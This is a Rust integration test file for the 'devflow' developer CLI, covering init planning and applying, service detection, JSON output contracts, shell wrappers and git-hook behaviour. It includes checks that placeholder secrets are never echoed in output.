//! End-to-end tests of the `devflow` binary against temporary Git repositories.
//!
//! Every run uses private `DEVFLOW_CONFIG_DIR` / `DEVFLOW_DATA_DIR` / `HOME`
//! directories. Tests that need the workspace pipeline (create, list, remove,
//! trust) run the real core; none of them need Docker or PostgreSQL.
use devflow_core::receipt::Receipt;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

struct Env {
    /// Owns every directory below.
    _tmp: tempfile::TempDir,
    root: PathBuf,
    repo: PathBuf,
}

impl Env {
    /// A Git repository with one commit at `<tmp>/repo`.
    fn new() -> Env {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        for dir in ["home", "config", "data"] {
            std::fs::create_dir_all(root.join(dir)).unwrap();
        }
        let repo = root.join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let git = git2::Repository::init(&repo).unwrap();
        std::fs::write(repo.join("README.md"), "hello\n").unwrap();
        let mut index = git.index().unwrap();
        index.add_path(Path::new("README.md")).unwrap();
        index.write().unwrap();
        let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
        let sig = git2::Signature::now("Test", "test@example.com").unwrap();
        git.commit(Some("HEAD"), &sig, &sig, "initial", &tree, &[])
            .unwrap();
        Env {
            _tmp: tmp,
            root,
            repo,
        }
    }

    fn command(&self, dir: &Path) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_devflow"));
        command
            .current_dir(dir)
            .env("HOME", self.root.join("home"))
            .env("DEVFLOW_CONFIG_DIR", self.root.join("config"))
            .env("DEVFLOW_DATA_DIR", self.root.join("data"))
            .env("NO_COLOR", "1")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .stdin(Stdio::null());
        for var in [
            "DEVFLOW_CD_FILE",
            "DEVFLOW_WRAPPED",
            "DEVFLOW_PREVIOUS",
            "COMPLETE",
            "CONDUCTOR_PORT",
            "CONDUCTOR_WORKSPACE_PATH",
            "DEVFLOW_TRUST_HOOKS",
            "DEVFLOW_NON_INTERACTIVE",
            "DEVFLOW_INSTANCE_ID",
            "DEVFLOW_SETUP_ACTIVE",
            "DEVFLOW_PG_ADMIN_URL",
            "XDG_CONFIG_HOME",
            "XDG_DATA_HOME",
        ] {
            command.env_remove(var);
        }
        command
    }

    /// Run in the main checkout.
    fn run(&self, args: &[&str]) -> Output {
        self.run_in(&self.repo, args)
    }

    fn run_in(&self, dir: &Path, args: &[&str]) -> Output {
        self.command(dir).args(args).output().unwrap()
    }

    /// `devflow init --yes` on the empty repository, then the `[hooks]`
    /// scaffold the tests below edit (`init` proposes only what it finds, and
    /// this repository has nothing to find).
    fn init(&self) {
        let out = self.run(&["init", "--yes", "--name", "shop"]);
        ok(&out);
        let mut text = std::fs::read_to_string(self.config_path()).unwrap();
        text.push_str("\n[hooks]\nsetup = []\nteardown = []\n");
        std::fs::write(self.config_path(), text).unwrap();
    }

    fn config_path(&self) -> PathBuf {
        self.repo.join("devflow.toml")
    }

    /// Replace `from` in `devflow.toml` (a line the generated file contains).
    fn edit_config(&self, from: &str, to: &str) {
        let text = std::fs::read_to_string(self.config_path()).unwrap();
        assert!(text.contains(from), "{from:?} not in:\n{text}");
        std::fs::write(self.config_path(), text.replace(from, to)).unwrap();
    }

    /// A directory holding an executable `name` that runs `script` with
    /// `FAKE_LOG` pointing at the returned log file.
    fn fake_program(&self, name: &str, script: &str) -> FakeProgram {
        let dir = self.root.join(format!("fake-{name}"));
        std::fs::create_dir_all(&dir).unwrap();
        let program = dir.join(name);
        std::fs::write(&program, format!("#!/bin/sh\n{script}\n")).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        FakeProgram {
            dir,
            log: self.root.join(format!("{name}.log")),
        }
    }
}

struct FakeProgram {
    dir: PathBuf,
    log: PathBuf,
}

impl FakeProgram {
    /// What the program wrote: `KEY=value` lines (`ARG` repeats).
    fn lines(&self) -> Vec<String> {
        std::fs::read_to_string(&self.log)
            .unwrap_or_else(|error| panic!("{} was not run: {error}", self.log.display()))
            .lines()
            .map(str::to_string)
            .collect()
    }

    fn args(&self) -> Vec<String> {
        self.lines()
            .iter()
            .filter_map(|line| line.strip_prefix("ARG=").map(str::to_string))
            .collect()
    }
}

fn stdout(out: &Output) -> String {
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn stderr(out: &Output) -> String {
    String::from_utf8_lossy(&out.stderr).into_owned()
}

fn describe(out: &Output) -> String {
    format!(
        "status: {:?}\n--- stdout ---\n{}\n--- stderr ---\n{}",
        out.status.code(),
        stdout(out),
        stderr(out)
    )
}

/// Assert exit status 0.
fn ok(out: &Output) -> &Output {
    assert!(out.status.success(), "{}", describe(out));
    out
}

fn failed(out: &Output) -> &Output {
    assert_eq!(out.status.code(), Some(1), "{}", describe(out));
    out
}

/// Parse stdout as the single JSON document the command promises.
fn json(out: &Output) -> Value {
    serde_json::from_slice(&out.stdout).unwrap_or_else(|error| {
        panic!(
            "stdout is not one JSON document ({error}):\n{}",
            describe(out)
        )
    })
}

fn same_path(a: &str, b: &Path) -> bool {
    Path::new(a.trim()).canonicalize().ok() == b.canonicalize().ok()
}

// --- no core pipeline needed ------------------------------------------------

#[test]
fn help_lists_the_commands() {
    let env = Env::new();
    let out = env.run(&["--help"]);
    ok(&out);
    let text = stdout(&out);
    for command in [
        "init",
        "switch",
        "list",
        "path",
        "setup",
        "remove",
        "trust",
        "hook",
        "db",
        "doctor",
        "shell-init",
        "completions",
        "gui",
    ] {
        assert!(
            text.lines()
                .any(|line| line.trim_start().starts_with(command)),
            "`{command}` missing from --help:\n{text}"
        );
    }
    for flag in ["--json", "--non-interactive", "-C"] {
        assert!(text.contains(flag), "{flag} missing from --help:\n{text}");
    }
}

#[test]
fn db_help_lists_the_subcommands() {
    let env = Env::new();
    let text = stdout(ok(&env.run(&["db", "--help"])));
    for command in [
        "status",
        "up",
        "down",
        "url",
        "psql",
        "reset",
        "reconcile",
        "snapshot",
        "branch",
    ] {
        assert!(text.contains(command), "`db {command}` missing:\n{text}");
    }
    let text = stdout(ok(&env.run(&["db", "branch", "create", "--help"])));
    assert!(text.contains("--instance-id"), "{text}");
    assert!(text.contains("--data-from"), "{text}");
    // Orphaned scratch databases are dropped only on request.
    let text = stdout(ok(&env.run(&["db", "reconcile", "--help"])));
    assert!(text.contains("--drop-orphans"), "{text}");
}

#[test]
fn init_writes_the_config_and_a_second_run_adds_nothing() {
    let env = Env::new();
    ok(&env.run(&["init", "--yes", "--name", "shop"]));
    let text = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(text.contains("name = \"shop\""), "{text}");

    // Nothing left to propose: not an error, and the file is untouched.
    let second = env.run(&["init", "--yes"]);
    ok(&second);
    assert!(
        stdout(&second).contains("Nothing to write"),
        "{}",
        describe(&second)
    );
    assert_eq!(std::fs::read_to_string(env.config_path()).unwrap(), text);

    // `init` registers the project for `list --all` and the desktop app.
    let registry = std::fs::read_to_string(env.root.join("config/projects.toml")).unwrap();
    assert!(registry.contains("shop"), "{registry}");
}

#[test]
fn init_without_a_terminal_or_a_flag_explains_the_choices() {
    let env = Env::new();
    let out = env.run(&["init"]);
    failed(&out);
    let text = stderr(&out);
    for flag in ["--plan", "--apply", "--yes"] {
        assert!(text.contains(flag), "{}", describe(&out));
    }
    assert!(!env.config_path().exists());

    // --json never prompts either, and says so as a document.
    let out = env.run(&["--json", "init"]);
    failed(&out);
    assert!(json(&out)["error"].as_str().unwrap().contains("--plan"));

    // These only make sense when something is written.
    let out = env.run(&["init", "--accept", "x"]);
    failed(&out);
    assert!(
        stderr(&out).contains("--apply or --yes"),
        "{}",
        describe(&out)
    );
    let out = env.run(&["init", "--plan", "--yes"]);
    failed(&out);
}

#[test]
fn init_supports_json_postgres_and_dash_c() {
    let env = Env::new();
    // `-C` lets any directory act as the project; here the temp root is not a repository.
    let out = env.run_in(
        &env.root,
        &[
            "--json",
            "-C",
            env.repo.to_str().unwrap(),
            "init",
            "--yes",
            "--postgres",
            "external",
        ],
    );
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["version"], 1);
    assert_eq!(doc["command"], "init");
    assert_eq!(doc["project"]["name"], "repo");
    assert_eq!(doc["postgres"], "external");
    assert_eq!(doc["applied"], json!(["project:init", "service:db"]));
    assert!(
        std::fs::read_to_string(env.config_path())
            .unwrap()
            .contains("mode = \"external\"")
    );
    let steps = doc["next_steps"].as_array().unwrap();
    assert!(
        steps
            .iter()
            .any(|s| s.as_str().unwrap().contains("devflow trust")),
        "{doc}"
    );
}

/// Files of a Bun + Prisma project with compose running Postgres 16, Redis and
/// MongoDB (which devflow does not branch).
fn stack(env: &Env) {
    let files = [
        (
            "package.json",
            r#"{"name":"shop","scripts":{"dev":"next dev"},"dependencies":{"next":"15.1.0","@prisma/client":"6.1.0"},"devDependencies":{"prisma":"6.1.0"}}"#,
        ),
        ("bun.lock", "{}\n"),
        ("next.config.ts", "export default {};\n"),
        (
            "prisma/schema.prisma",
            "datasource db {\n  provider = \"postgresql\"\n  url      = env(\"DATABASE_URL\")\n}\n",
        ),
        (
            "prisma/migrations/20240101000000_init/migration.sql",
            "CREATE TABLE t (id int);\n",
        ),
        (
            "compose.yaml",
            "services:\n  db:\n    image: postgres:16\n  redis:\n    image: redis:7\n  mongo:\n    image: mongo:7\n",
        ),
        (".env", "DATABASE_URL=THIS_VALUE_MUST_NOT_LEAK\n"),
        (".gitignore", ".env\nnode_modules\n"),
    ];
    for (path, text) in files {
        let full = env.repo.join(path);
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(full, text).unwrap();
    }
}

fn applied(doc: &Value) -> Vec<&str> {
    doc["applied"]
        .as_array()
        .unwrap()
        .iter()
        .map(|id| id.as_str().unwrap())
        .collect()
}

#[test]
fn init_plan_shows_the_proposal_and_writes_nothing() {
    let env = Env::new();
    stack(&env);
    let out = env.run(&["init", "--plan"]);
    ok(&out);
    let text = stdout(&out);
    for expected in [
        "Proposed setup",
        "service:db",
        "hook:setup:migrate",
        "env:preset:prisma",
        "evidence: compose.yaml:services.db.image",
        "! compose runs PostgreSQL 16",
        "medium",
    ] {
        assert!(text.contains(expected), "{expected}\n{text}");
    }
    assert!(!text.contains("THIS_VALUE_MUST_NOT_LEAK"));
    assert!(
        stderr(&out).contains("Nothing was written"),
        "{}",
        describe(&out)
    );
    assert!(!env.config_path().exists());
    assert!(!env.repo.join("pitchfork.toml").exists());
}

/// Conflicts with the existing configuration name keys; they never repeat what
/// the files hold, so a password inline in a hook command or an env file path
/// reaches neither the plain-text plan, the JSON plan nor an apply error.
/// (`--password X` is a form output masking does not recognise: the text must
/// never have been copied.)
#[test]
fn conflicts_never_repeat_what_the_existing_files_hold() {
    const MARKER: &str = "hunter2-MARKER-8c1f"; // kingfisher:ignore
    let env = Env::new();
    std::fs::write(
        env.repo.join("package.json"),
        r#"{"name":"shop","scripts":{"dev":"next dev"},"dependencies":{"next":"15.1.0"}}"#,
    )
    .unwrap();
    std::fs::write(env.repo.join("bun.lock"), "{}\n").unwrap();
    std::fs::write(
        env.repo.join("devflow.toml"),
        format!(
            "[project]\nname = \"shop-{MARKER}\"\nid = \"11111111-2222-4333-8444-555555555555\"\n\n\
             [services.main]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\n\n\
             [hooks]\nsetup = [\n  {{ name = \"install\", run = \"make deps --password {MARKER}\" }},\n]\n"
        ),
    )
    .unwrap();
    std::fs::write(
        env.repo.join("mise.toml"),
        format!("[env]\n_.file = \"/home/{MARKER}/.env\"\n"),
    )
    .unwrap();

    let text = env.run(&["init", "--plan", "--name", "other"]);
    ok(&text);
    let shown = stdout(&text);
    // The conflicts are there, naming their keys.
    assert!(shown.contains("hook:setup:install"), "{shown}");
    assert!(shown.contains("hooks.setup"), "{shown}");
    assert!(shown.contains("project.name"), "{shown}");
    assert!(shown.contains("env._.file"), "{shown}");

    let planned = env.run(&["--json", "init", "--plan", "--name", "other"]);
    ok(&planned);
    let plan = json(&planned);
    assert!(plan["items"].as_array().unwrap().iter().any(|item| {
        item["id"] == "hook:setup:install" && !item["conflicts"].as_array().unwrap().is_empty()
    }));

    // Accepting the blocked item is refused, with the same discipline.
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &planned.stdout).unwrap();
    let applied = env.run(&[
        "init",
        "--apply",
        plan_file.to_str().unwrap(),
        "--accept",
        "hook:setup:install",
    ]);
    failed(&applied);
    assert!(
        stderr(&applied).contains("hook:setup:install"),
        "{}",
        describe(&applied)
    );

    for (what, out) in [
        ("plain plan", &text),
        ("JSON plan", &planned),
        ("apply", &applied),
    ] {
        let all = format!("{}{}", stdout(out), stderr(out));
        assert!(!all.contains(MARKER), "{what} holds the marker:\n{all}");
        assert!(!all.contains("hunter2"), "{what} holds part of it:\n{all}");
    }
}

#[test]
fn a_plan_saved_as_json_applies_later() {
    let env = Env::new();
    stack(&env);
    let planned = env.run(&["--json", "init", "--plan", "--name", "shop"]);
    ok(&planned);
    let plan = json(&planned);
    assert_eq!(plan["version"], 1);
    assert_eq!(plan["command"], "init");
    assert_eq!(plan["proposal_version"], 1);
    assert_eq!(plan["schema_version"], 1);
    let ids: Vec<&str> = plan["items"]
        .as_array()
        .unwrap()
        .iter()
        .map(|item| item["id"].as_str().unwrap())
        .collect();
    for id in [
        "project:init",
        "copy:.env",
        "service:db",
        "service:redis",
        "hook:setup:install",
        "hook:setup:codegen",
        "hook:setup:migrate",
        "env:preset:prisma",
        "hook:setup:compose-up",
        "mise:env-file",
        "daemon:web",
    ] {
        assert!(ids.contains(&id), "{id} in {ids:?}");
    }
    assert!(plan["input_hashes"]["detection"].is_string());
    assert!(plan["input_hashes"]["devflow.toml"].is_null());
    assert!(!stdout(&planned).contains("THIS_VALUE_MUST_NOT_LEAK"));
    assert!(!env.config_path().exists(), "planning writes nothing");

    // Review, save, apply: the default is the high-confidence items.
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &planned.stdout).unwrap();
    let out = env.run(&["--json", "init", "--apply", plan_file.to_str().unwrap()]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "init");
    assert_eq!(doc["project"]["name"], "shop");
    assert_eq!(doc["postgres"], "managed");
    assert_eq!(
        applied(&doc),
        vec![
            "project:init",
            "copy:.env",
            "service:db",
            "service:redis",
            "hook:setup:install",
            "hook:setup:codegen",
            "hook:setup:migrate",
            "env:preset:prisma",
            "daemon:web",
        ]
    );
    // The daemon goes through `devflow exec`, which delivers the workspace's
    // variables whatever mise says, so it does not wait for the mise file the
    // plan would create (a medium-confidence item, left out).
    assert!(doc["dropped"].as_array().unwrap().is_empty(), "{doc}");
    let files = doc["files"].as_array().unwrap();
    assert_eq!(files.len(), 2);
    assert_eq!(files[0]["file"], "devflow.toml");
    assert_eq!(files[0]["status"], "created");
    assert_eq!(files[1]["file"], "pitchfork.toml");
    let pitchfork = std::fs::read_to_string(env.repo.join("pitchfork.toml")).unwrap();
    assert!(
        pitchfork.contains("run = \"devflow exec -- bun run dev\""),
        "{pitchfork}"
    );
    assert!(!env.repo.join("mise.toml").exists());
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(config.contains("image = \"postgres:18\""), "{config}");
    assert!(config.contains("bunx prisma migrate deploy"), "{config}");
    assert!(!config.contains("THIS_VALUE_MUST_NOT_LEAK"));
    // Redis is a recommended service item, applied; the MongoDB compose
    // hooks are medium items, not.
    assert!(
        config.contains("[services.redis]")
            && config.contains("engine = \"redis\"")
            && config.contains("image = \"redis:7\""),
        "{config}"
    );
    assert!(!config.contains("mongo"), "medium items were not applied");
    assert_eq!(
        doc["services"],
        json!([
            {"key": "db", "engine": "postgres"},
            {"key": "redis", "engine": "redis"},
        ])
    );
    assert!(env.repo.join(".git/devflow/init-apply.json").exists());

    // The result is a project the rest of devflow reads, and it asks for approval.
    let trust = env.run(&["--json", "trust"]);
    ok(&trust);
    let trust = json(&trust);
    assert_eq!(trust["trust"]["state"], "untrusted", "{trust}");
    let setup = trust["scope"]["hooks"]["setup"].as_array().unwrap();
    assert_eq!(setup.len(), 3);
    assert_eq!(trust["scope"]["env"]["presets"], json!(["prisma"]));

    // Applying the same plan again changes nothing.
    let again = env.run(&["--json", "init", "--apply", plan_file.to_str().unwrap()]);
    ok(&again);
    let again = json(&again);
    assert_eq!(again["already_applied"], true);
    assert_eq!(std::fs::read_to_string(env.config_path()).unwrap(), config);
}

/// A repository whose compose file runs the given datastores, plus an `.env`
/// that names the cache variable (never its value).
fn datastores(env: &Env, compose: &str) {
    for (path, text) in [
        ("compose.yaml", compose),
        (".env.example", "CACHE_URL=\nDATABASE_URL=\n"),
        ("README.md", "hello\n"),
    ] {
        std::fs::write(env.repo.join(path), text).unwrap();
    }
}

#[test]
fn init_proposes_valkey_redis_and_mysql_services_natively() {
    let env = Env::new();
    datastores(
        &env,
        "services:\n  cache:\n    image: valkey/valkey:8-alpine\n  db:\n    image: mysql:8.4\n  \
         search:\n    image: redis/redis-stack\n  old:\n    image: mysql:5.7\n",
    );
    let planned = env.run(&["--json", "init", "--plan", "--name", "shop"]);
    ok(&planned);
    let plan = json(&planned);
    let items = plan["items"].as_array().unwrap();
    let find = |id: &str| {
        items
            .iter()
            .find(|item| item["id"] == id)
            .unwrap_or_else(|| panic!("{id} in {plan}"))
    };
    let cache = find("service:cache");
    assert_eq!(cache["kind"], "service");
    assert_eq!(cache["confidence"], "high");
    assert_eq!(cache["value"]["engine"], "valkey");
    assert_eq!(cache["value"]["image"], "valkey/valkey:8-alpine");
    assert_eq!(cache["value"]["env"], "CACHE_URL");
    assert_eq!(cache["patch"]["file"], "devflow.toml");
    let mysql = find("service:mysql");
    assert_eq!(mysql["confidence"], "medium");
    assert_eq!(mysql["value"]["preview"], true);
    assert!(mysql["title"].as_str().unwrap().contains("preview"));
    // Not proposed, with the reason, and pointing to the manual configuration.
    let warnings: Vec<&str> = plan["warnings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|w| w.as_str().unwrap())
        .collect();
    let said = |needle: &str| warnings.iter().any(|w| w.contains(needle));
    assert!(
        said("`search` (redis/redis-stack)")
            && said("not proposed automatically")
            && said("README, \u{201c}Valkey and Redis branches\u{201d}"),
        "{warnings:?}"
    );
    assert!(
        said("`old` (mysql:5.7)") && said("unsupported") && said("MySQL 8.4 only"),
        "{warnings:?}"
    );
    // The compose hook starts what devflow does not branch, and nothing else.
    assert_eq!(
        find("hook:setup:compose-up")["value"]["run"],
        "docker compose up -d --wait old search"
    );
    assert!(!stdout(&planned).contains("hunter2"));
    assert!(!env.config_path().exists());

    // The text plan lists the same items.
    let text = stdout(&env.run(&["init", "--plan", "--name", "shop"]));
    for expected in [
        "service:cache",
        "service:mysql",
        "(preview)",
        "evidence: compose.yaml",
    ] {
        assert!(text.contains(expected), "{expected}\n{text}");
    }

    // Apply: Valkey by default, MySQL only when named.
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &planned.stdout).unwrap();
    let path = plan_file.to_str().unwrap();
    let out = env.run(&["--json", "init", "--apply", path]);
    ok(&out);
    let doc = json(&out);
    assert!(applied(&doc).contains(&"service:cache"), "{doc}");
    assert!(!applied(&doc).contains(&"service:mysql"), "{doc}");
    assert_eq!(
        doc["services"],
        json!([{"key": "cache", "engine": "valkey"}])
    );
    assert!(
        doc["next_steps"]
            .as_array()
            .unwrap()
            .iter()
            .any(|s| s.as_str().unwrap().contains("devflow service status")),
        "{doc}"
    );
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(
        config.contains("[services.cache]")
            && config.contains("engine = \"valkey\"")
            && config.contains("env = \"CACHE_URL\""),
        "{config}"
    );
    // The project reads back, with the cache variable the application uses.
    ok(&env.run(&["--json", "list"]));

    // A second plan does not offer the cache again.
    let again = json(&env.run(&["--json", "init", "--plan"]));
    assert!(
        again["items"]
            .as_array()
            .unwrap()
            .iter()
            .all(|item| item["id"] != "service:cache"),
        "{again}"
    );
    let plan_file = env.root.join("plan2.json");
    std::fs::write(&plan_file, serde_json::to_vec(&again).unwrap()).unwrap();
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        plan_file.to_str().unwrap(),
        "--accept",
        "service:mysql",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(applied(&doc).contains(&"service:mysql"), "{doc}");
    assert_eq!(
        doc["services"],
        json!([
            {"key": "cache", "engine": "valkey"},
            {"key": "mysql", "engine": "mysql"},
        ])
    );
    // Both load together: core refuses two services that share a variable.
    ok(&env.run(&["--json", "list"]));
}

#[test]
fn init_rejects_a_proposed_service_by_id() {
    let env = Env::new();
    datastores(&env, "services:\n  redis:\n    image: redis:7\n");
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &env.run(&["--json", "init", "--plan"]).stdout).unwrap();
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        plan_file.to_str().unwrap(),
        "--reject",
        "service:redis",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(!applied(&doc).contains(&"service:redis"), "{doc}");
    assert!(
        !std::fs::read_to_string(env.config_path())
            .unwrap()
            .contains("[services"),
    );
}

#[test]
fn apply_takes_accept_and_reject_by_id() {
    let env = Env::new();
    stack(&env);
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &env.run(&["--json", "init", "--plan"]).stdout).unwrap();
    let path = plan_file.to_str().unwrap();

    // Rejecting the service takes what needs it along.
    let out = env.run(&["--json", "init", "--apply", path, "--reject", "service:db"]);
    ok(&out);
    let doc = json(&out);
    assert!(!applied(&doc).contains(&"service:db"));
    assert!(!applied(&doc).contains(&"hook:setup:migrate"));
    let dropped: Vec<&str> = doc["dropped"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["id"].as_str().unwrap())
        .collect();
    assert!(dropped.contains(&"hook:setup:migrate"), "{doc}");
    assert!(dropped.contains(&"env:preset:prisma"), "{doc}");
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(
        !config.contains("[services.db]") && config.contains("[services.redis]"),
        "{config}"
    );

    // A medium item can be accepted by name; a second apply of a different
    // selection is a new plan against the new files.
    let env = Env::new();
    stack(&env);
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &env.run(&["--json", "init", "--plan"]).stdout).unwrap();
    let path = plan_file.to_str().unwrap();
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        path,
        "--accept",
        "hook:setup:compose-up",
        "--accept",
        "mise:env-file",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(applied(&doc).contains(&"hook:setup:compose-up"), "{doc}");
    assert!(applied(&doc).contains(&"daemon:web"), "{doc}");
    assert!(env.repo.join("pitchfork.toml").exists());
    assert!(
        std::fs::read_to_string(env.repo.join("mise.toml"))
            .unwrap()
            .contains("_.file = \".devflow/env\"")
    );

    // Only the named items with --no-defaults; their dependencies must be named too.
    let env = Env::new();
    stack(&env);
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &env.run(&["--json", "init", "--plan"]).stdout).unwrap();
    let path = plan_file.to_str().unwrap();
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        path,
        "--no-defaults",
        "--accept",
        "hook:setup:migrate",
    ]);
    failed(&out);
    let message = json(&out)["error"].as_str().unwrap().to_string();
    assert!(message.contains("needs \"service:db\""), "{message}");
    assert!(!env.config_path().exists());
    ok(&env.run(&[
        "init",
        "--apply",
        path,
        "--no-defaults",
        "--accept",
        "project:init",
    ]));
}

#[test]
fn a_stale_or_foreign_plan_is_refused_without_writing() {
    let env = Env::new();
    stack(&env);
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &env.run(&["--json", "init", "--plan"]).stdout).unwrap();
    let path = plan_file.to_str().unwrap();

    // The repository changed after the plan was made.
    std::fs::write(
        env.repo.join("pitchfork.toml"),
        "[daemons.mine]\nrun = \"x\"\n",
    )
    .unwrap();
    let out = env.run(&["--json", "init", "--apply", path]);
    failed(&out);
    let message = json(&out)["error"].as_str().unwrap().to_string();
    assert!(
        message.contains("changed since the plan was made"),
        "{message}"
    );
    assert!(message.contains("pitchfork.toml (created)"), "{message}");
    assert!(!env.config_path().exists());

    // Not a plan.
    let other = env.root.join("other.json");
    std::fs::write(&other, "{\"hello\": 1}").unwrap();
    let out = env.run(&["--json", "init", "--apply", other.to_str().unwrap()]);
    failed(&out);
    assert!(
        json(&out)["error"]
            .as_str()
            .unwrap()
            .contains("not a devflow init plan")
    );
    std::fs::write(&other, "not json").unwrap();
    failed(&env.run(&["init", "--apply", other.to_str().unwrap()]));
    failed(&env.run(&[
        "init",
        "--apply",
        env.root.join("missing.json").to_str().unwrap(),
    ]));

    // An id the plan does not have, and options that make no sense with a saved plan.
    let out = env.run(&["--json", "init", "--apply", path, "--accept", "nope"]);
    failed(&out);
    assert!(
        json(&out)["error"]
            .as_str()
            .unwrap()
            .contains("no item \"nope\"")
    );
    failed(&env.run(&["init", "--apply", path, "--name", "other"]));
}

#[test]
fn init_yes_applies_the_high_confidence_items_and_can_install_the_hook() {
    let env = Env::new();
    stack(&env);
    let out = env.run(&["init", "--yes", "--hook"]);
    ok(&out);
    let text = stdout(&out);
    assert!(text.contains("devflow.toml created"), "{}", describe(&out));
    assert!(stderr(&out).contains("devflow trust"), "{}", describe(&out));
    assert!(env.config_path().exists());
    assert!(env.repo.join(".git/hooks/post-checkout").exists());
    let pitchfork = std::fs::read_to_string(env.repo.join("pitchfork.toml")).unwrap();
    assert!(pitchfork.contains("devflow exec -- "), "{pitchfork}");
    assert!(
        !env.repo.join("mise.toml").exists(),
        "the wiring is medium here"
    );
}

#[test]
fn legacy_configuration_is_an_error_that_mentions_0x() {
    let env = Env::new();
    std::fs::write(env.repo.join(".devflow.yml"), "services: []\n").unwrap();
    let out = env.run(&["list"]);
    failed(&out);
    assert!(stderr(&out).contains("0.x"), "{}", describe(&out));

    let out = env.run(&["--json", "list"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "list");
    assert!(doc["error"].as_str().unwrap().contains("0.x"), "{doc}");
}

#[test]
fn shell_init_prints_the_wrapper() {
    let env = Env::new();
    for shell in ["zsh", "bash", "fish"] {
        let out = env.run(&["shell-init", shell]);
        ok(&out);
        let text = stdout(&out);
        assert!(text.contains("DEVFLOW_CD_FILE"), "{shell}: {text}");
        assert!(text.contains("DEVFLOW_WRAPPED=1"), "{shell}: {text}");
        assert!(text.contains("DEVFLOW_PREVIOUS"), "{shell}: {text}");
        assert!(text.contains("command devflow"), "{shell}: {text}");
        assert!(text.contains(shell), "{shell}: {text}");
    }
    assert!(stdout(&env.run(&["shell-init", "zsh"])).contains("devflow() {"));
    assert!(stdout(&env.run(&["shell-init", "fish"])).contains("function devflow"));
    failed(&env.run(&["shell-init", "powershell"]));
}

#[test]
fn json_is_rejected_for_commands_that_cannot_emit_it() {
    let env = Env::new();
    for (args, command) in [
        (["--json", "shell-init", "zsh"].as_slice(), "shell-init"),
        (["--json", "completions", "bash"].as_slice(), "completions"),
        (["--json", "gui"].as_slice(), "gui"),
        (["--json", "db", "psql"].as_slice(), "db psql"),
    ] {
        let out = env.run(args);
        failed(&out);
        // The refusal itself honors the one-document contract.
        let doc = json(&out);
        assert_eq!(doc["command"], command, "{args:?}: {doc}");
        assert!(
            doc["error"].as_str().unwrap().contains("--json"),
            "{args:?}: {doc}"
        );
        assert!(
            stderr(&out).contains("--json"),
            "{args:?}: {}",
            describe(&out)
        );
    }
}

#[test]
fn completions_cover_the_binary() {
    let env = Env::new();
    for shell in ["bash", "zsh", "fish"] {
        let out = env.run(&["completions", shell]);
        ok(&out);
        assert!(stdout(&out).contains("devflow"), "{shell}");
    }
}

#[test]
fn usage_errors_do_not_collide_with_the_attention_exit_code() {
    let env = Env::new();
    let out = env.run(&["switch"]);
    assert_eq!(out.status.code(), Some(1), "{}", describe(&out));
    let out = env.run(&["no-such-command"]);
    assert_eq!(out.status.code(), Some(1), "{}", describe(&out));
}

#[test]
fn early_json_errors_name_the_command_not_an_option_value() {
    let env = Env::new();
    // `list` is the directory given to -C, not the command that failed.
    for args in [
        ["--json", "-C", "list", "path"].as_slice(),
        ["-C", "db", "--json", "path"].as_slice(),
        ["--json", "-Clist", "path"].as_slice(),
    ] {
        let out = env.run(args);
        failed(&out);
        let doc = json(&out);
        assert_eq!(doc["command"], "path", "{args:?}: {doc}");
        assert!(
            doc["error"].as_str().unwrap().contains("<NAME>"),
            "{args:?}: {doc}"
        );
    }
    // A -C without a command is not aimed at the directory's name either.
    let out = env.run(&["--json", "-C", "list"]);
    failed(&out);
    assert_eq!(json(&out)["command"], "devflow");
}

#[test]
fn git_hook_entry_point_does_not_accept_json() {
    let env = Env::new();
    // One JSON document and exit 1, not a stderr line and exit 0; the hook
    // re-entry guard does not turn the refusal into a silent success.
    for guard in [false, true] {
        let mut command = env.command(&env.repo);
        command.args(["--json", "setup", "--if-new", "--from-git-hook"]);
        if guard {
            command.env("DEVFLOW_SETUP_ACTIVE", "1");
        }
        let out = command.output().unwrap();
        failed(&out);
        let doc = json(&out);
        assert_eq!(doc["command"], "setup", "{doc}");
        assert!(
            doc["error"].as_str().unwrap().contains("--from-git-hook"),
            "{doc}"
        );
        assert!(stderr(&out).contains("--json"), "{}", describe(&out));
    }
}

#[test]
fn git_hook_setup_never_fails_the_hook() {
    let env = Env::new();
    // Outside any project: one line on stderr, exit 0.
    let out = env.run_in(
        &env.root.join("home"),
        &["setup", "--if-new", "--from-git-hook"],
    );
    ok(&out);
    let text = stderr(&out);
    assert_eq!(text.lines().count(), 1, "{text}");
    assert!(text.contains("devflow setup"), "{text}");

